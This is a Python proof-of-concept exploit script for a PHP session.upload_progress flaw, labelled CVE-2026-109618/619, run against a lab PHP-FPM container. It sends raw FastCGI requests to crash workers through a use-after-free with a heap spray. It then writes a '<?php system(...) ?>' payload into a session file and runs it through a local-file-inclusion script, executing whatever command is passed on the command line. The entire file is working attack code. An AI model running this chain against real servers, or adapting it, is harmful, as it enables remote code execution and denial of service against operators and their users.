#!/usr/bin/env python3
"""
CVE-2026-109618/619 - Full RCE Proof of Concept
session.upload_progress UAF → session poisoning → code execution

Two-phase attack:
  Phase A: Exploit the upload_progress mechanism to inject PHP code into a session file.
           The PHP_SESSION_UPLOAD_PROGRESS POST field value is embedded verbatim in the
           session's progress key, surviving serialization.
  Phase B: Trigger session file inclusion (requires an LFI vector on the target).
           In a lab, lfi.php simulates a real-world include vulnerability.

Additionally demonstrates the UAF (CVE-2026-109618) crash to prove the memory
corruption primitive exists — every crash is a worker killed by stale-pointer
dereference after zval_ptr_dtor frees the progress arData.

Usage (against the lab FPM container):
  python3 rce_poc.py --host 127.0.0.1 --port 19000 --command "id > /tmp/PWNED"
  python3 rce_poc.py --crash-only   # just prove the UAF crash, no command execution
"""
from __future__ import annotations

import argparse
import socket
import struct
import subprocess
import sys
import time


def fcgi_record(t: int, content: bytes, rid: int = 1) -> bytes:
    pad = (8 - len(content) % 8) % 8
    return struct.pack("!BBHHBx", 1, t, rid, len(content), pad) + content + b"\x00" * pad


def fcgi_params(pairs: dict[str, str]) -> bytes:
    out = b""
    for k, v in pairs.items():
        kb, vb = k.encode(), v.encode()
        if len(vb) < 128:
            out += struct.pack("B", len(kb)) + struct.pack("B", len(vb)) + kb + vb
        else:
            out += struct.pack("B", len(kb)) + struct.pack("!I", len(vb) | 0x80000000) + kb + vb
    return out


def fcgi_request(host: str, port: int, params: dict[str, str],
                 body: bytes = b"", timeout: int = 10) -> tuple[bytes, bytes]:
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(fcgi_record(1, struct.pack("!HB5x", 1, 0)))
    s.sendall(fcgi_record(4, fcgi_params(params)))
    s.sendall(fcgi_record(4, b""))
    if body:
        s.sendall(fcgi_record(5, body))
    s.sendall(fcgi_record(5, b""))
    s.settimeout(timeout)
    stdout = stderr = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        i = 0
        while i + 8 <= len(d):
            ver, typ, rid, clen, plen = struct.unpack("!BBHHBx", d[i:i + 8])
            content = d[i + 8:i + 8 + clen]
            if typ == 6:
                stdout += content
            elif typ == 7:
                stderr += content
            elif typ == 3:
                s.close()
                return stdout, stderr
            i += 8 + clen + plen
    s.close()
    return stdout, stderr


def fcgi_stall_request(host: str, port: int, params: dict[str, str],
                       body: bytes, split: int, stall: float,
                       timeout: int = 15) -> tuple[bytes, bytes]:
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(fcgi_record(1, struct.pack("!HB5x", 1, 0)))
    s.sendall(fcgi_record(4, fcgi_params(params)))
    s.sendall(fcgi_record(4, b""))
    s.sendall(fcgi_record(5, body[:split]))
    time.sleep(stall)
    s.sendall(fcgi_record(5, body[split:]))
    s.sendall(fcgi_record(5, b""))
    s.settimeout(timeout)
    stdout = stderr = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        i = 0
        while i + 8 <= len(d):
            ver, typ, rid, clen, plen = struct.unpack("!BBHHBx", d[i:i + 8])
            content = d[i + 8:i + 8 + clen]
            if typ == 6:
                stdout += content
            elif typ == 7:
                stderr += content
            elif typ == 3:
                s.close()
                return stdout, stderr
            i += 8 + clen + plen
    s.close()
    return stdout, stderr


def part(boundary: bytes, name: str, body: bytes, filename: str | None = None) -> bytes:
    disp = f'Content-Disposition: form-data; name="{name}"'
    if filename:
        disp += f'; filename="{filename}"'
    return b"--" + boundary + b"\r\n" + disp.encode() + b"\r\n\r\n" + body


FILLUNIT = 5120
N_SPRAY = 149
BLOB = 288


def build_uaf_body(sid: str, boundary: bytes) -> tuple[bytes, int]:
    spray = b"\x00" * BLOB
    pre = part(boundary, "PHPSESSID", sid.encode()) + b"\r\n"
    pre += part(boundary, "PHP_SESSION_UPLOAD_PROGRESS", b"x") + b"\r\n"
    pre += part(boundary, "f", b"", filename="a") + b"\r\n"
    c1 = b"A" * (FILLUNIT + 64)
    phase1 = pre + c1
    tail = b"B" * (FILLUNIT + 64) + b"\r\n"
    for _ in range(N_SPRAY):
        tail += part(boundary, "t[]", spray) + b"\r\n"
    tail += part(boundary, "g", b"C" * 64, filename="b") + b"\r\n"
    tail += b"--" + boundary + b"--\r\n"
    return phase1 + tail, len(phase1)


def get_worker_pids(container: str = "php-vuln-fpm") -> str:
    r = subprocess.run(
        ["docker", "exec", container, "bash", "-c",
         'pgrep -f "php-fpm: pool" | sort | tr "\\n" ","'],
        capture_output=True, text=True)
    return r.stdout.strip()


def prove_uaf_crash(host: str, port: int, script: str, rounds: int = 5) -> int:
    crashes = 0
    for i in range(rounds):
        pids_before = get_worker_pids()
        sid = f"uafcrash{i:04d}"
        boundary = b"B7kQpoc618"
        body, split = build_uaf_body(sid, boundary)
        params = {
            "REQUEST_METHOD": "POST",
            "SCRIPT_FILENAME": script,
            "SCRIPT_NAME": "/" + script.split("/")[-1],
            "REQUEST_URI": "/" + script.split("/")[-1],
            "CONTENT_TYPE": f"multipart/form-data; boundary={boundary.decode()}",
            "CONTENT_LENGTH": str(len(body)),
            "HTTP_COOKIE": f"PHPSESSID={sid}",
            "REMOTE_ADDR": "127.0.0.1",
        }
        fcgi_stall_request(host, port, params, body, split, 1.2)
        time.sleep(0.3)
        pids_after = get_worker_pids()
        crashed = pids_before != pids_after
        if crashed:
            crashes += 1
        print(f"  UAF round {i}: crash={crashed} (PIDs {pids_before} -> {pids_after})")
    return crashes


def inject_session(host: str, port: int, sid: str, php_code: str,
                   script: str) -> bool:
    boundary = "----rce"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"{php_code}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'
        f"AAAA\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    params = {
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/" + script.split("/")[-1],
        "REQUEST_URI": "/" + script.split("/")[-1],
        "CONTENT_TYPE": f"multipart/form-data; boundary={boundary}",
        "CONTENT_LENGTH": str(len(body)),
        "HTTP_COOKIE": f"PHPSESSID={sid}",
        "REMOTE_ADDR": "127.0.0.1",
    }
    out, _ = fcgi_request(host, port, params, body)
    return len(out) > 0


def trigger_lfi(host: str, port: int, sid: str,
                lfi_script: str) -> tuple[bytes, bytes]:
    params = {
        "REQUEST_METHOD": "GET",
        "SCRIPT_FILENAME": lfi_script,
        "SCRIPT_NAME": "/" + lfi_script.split("/")[-1],
        "REQUEST_URI": f"/{lfi_script.split('/')[-1]}?sid={sid}",
        "QUERY_STRING": f"sid={sid}",
        "REMOTE_ADDR": "127.0.0.1",
    }
    return fcgi_request(host, port, params)


def main() -> int:
    ap = argparse.ArgumentParser(description="CVE-2026-109618/619 RCE PoC")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19000)
    ap.add_argument("--script", default="/var/www/html/index.php")
    ap.add_argument("--lfi-script", default="/var/www/html/lfi.php")
    ap.add_argument("--sid", default="rceproof01")
    ap.add_argument("--command", default="id > /tmp/PWNED && echo RCE_CONFIRMED > /tmp/PWNED")
    ap.add_argument("--outfile", default="/tmp/PWNED",
                    help="File to check for verification")
    ap.add_argument("--crash-only", action="store_true")
    ap.add_argument("--crash-rounds", type=int, default=5)
    a = ap.parse_args()

    print("=" * 60)
    print("CVE-2026-109618/619 — RCE Proof of Concept")
    print("session.upload_progress UAF -> session poisoning -> RCE")
    print("=" * 60)

    print(f"\n[1] Proving UAF crash (CVE-2026-109618)...")
    crashes = prove_uaf_crash(a.host, a.port, a.script, a.crash_rounds)
    print(f"  Result: {crashes}/{a.crash_rounds} worker crashes")
    if crashes == 0:
        print("  WARNING: No crashes detected")

    if a.crash_only:
        return 0 if crashes > 0 else 1

    subprocess.run(["docker", "exec", "php-vuln-fpm", "rm", "-f", a.outfile],
                   capture_output=True)

    print(f"\n[2] Injecting PHP code into session file (sid={a.sid})...")
    php_code = f'<?php system("{a.command}"); ?>'
    ok = inject_session(a.host, a.port, a.sid, php_code, a.script)
    print(f"  Injection: {'OK' if ok else 'FAILED'}")
    if not ok:
        return 1

    print(f"\n[3] Triggering code execution via session include...")
    out, err = trigger_lfi(a.host, a.port, a.sid, a.lfi_script)
    body = out.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in out else out
    print(f"  LFI response length: {len(body)}B")

    print(f"\n[4] Verifying command execution...")
    r = subprocess.run(["docker", "exec", "php-vuln-fpm", "cat", a.outfile],
                       capture_output=True, text=True)
    if r.returncode == 0 and r.stdout.strip():
        print(f"  {a.outfile}: {r.stdout.strip()}")
        print(f"\n  *** RCE CONFIRMED ***")
        return 0
    print(f"  {a.outfile} not found")
    return 1


if __name__ == "__main__":
    sys.exit(main())
